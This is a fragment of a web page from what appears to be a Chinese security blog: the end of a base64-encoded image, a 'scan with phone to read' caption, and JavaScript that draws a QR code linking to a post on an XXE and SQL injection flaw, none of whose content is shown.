+vh9StdOv19wiphRGt6QjJdV0O8SGo3tE9nOmw7nMYSG928589ge0ndcjUVlOGuQ/RIbjaPsx9GHXvL0J8CPb+EB2eaK1ZOTwzgPb2vwI0pwF8/9t/1/U7QvIwx1V+r99vyP40PuB6G4hPAWS67k1dDqOv3hGS6/UrDsnDiPZd1akXmoX0WPHK1lr5kPrK1IKRWydCfHnV1FpxdRFSD9z/HvL4sI/td1nuqyZbSy6Wtl8rfZ+pa3Mdy6sFeTq63zmc56rfftlDTS52Hc7vYW0hJG8fEUYdwqumlrm6riUv3P7KKuNe7z+Bw3dZqy1BpgzBmmYtCF/VdR2Sh2D12C/zap2rQ+r1CyEaBM2WV0sO8UurpV7X/8bq/TqH3L/rde/7DalT+KB1GAhkehB0r05TVBdhzKt3vFoPYz8YuX0gOqz/TR2S6XuRw9yHue69RUgOgvYVIToEVzpwf5f1+LCPw3dZ7s/py0XIlCG4yvW8/HfR+0DuC8F9P4gGI+4z+2tIbq/Vtff6+vr6/im+tP2CeZ0ZiA9BddH+8j0e/sram/f1z5/A9l2WUxNXW9EXIU+B/KwOkjcH4daL+p13XX+PZkS9zle6uY6QvarDyO3X0XzHnit+vyH9lN7Mt68hkGnDNez7htSpw2teT8N+WSfqQfpAUF+E6IDSZQSmv82F6BB0LzaWi+oipE7eEdb+/Yb003oz3wbitM/w6n57H+vU5VdxVadeuOoFeSIh2HMw6tWrljkYfQiHoDmxamvJxdJqySH18MRtIIZufO8JHAYCz2nB8/pXtwmpvVoHyUOw18GoQzgc0dp6Gmer+3IR0lMuznqVpg+pgxG7Lxerh+swEEM3vucE/vFAnKy4+jT0Yf706IuQnLz3Vd+jGTU5pBeMqN+x13cf0ke958+4vgjpB9y/y3p82Mc/fkNWn4/T7/5Kh+dTAs/f3EL03mfGV71n2b1mHYz3Uhf3Na+uYezTszD69i/8YwPpm7j5tRM4DKSmNFtn7SBTh2DPQ3QIeo+eU4fkznxIDp5oDUSzZ8dVruuQPhDsvrz3l+t3hLFf+YeBlHiv953ANhDItOA1rra6ehog/Vb+1X5X6lcZyB5gxH5veO3bX7QeUidfYa8zB6kH7u+yHh/2sb0hH7av/+x2/gcAAP//8enqyAAAAAZJREFUAwAG44+5NgvV5wAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-LoginTemplate-XmlHttp-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 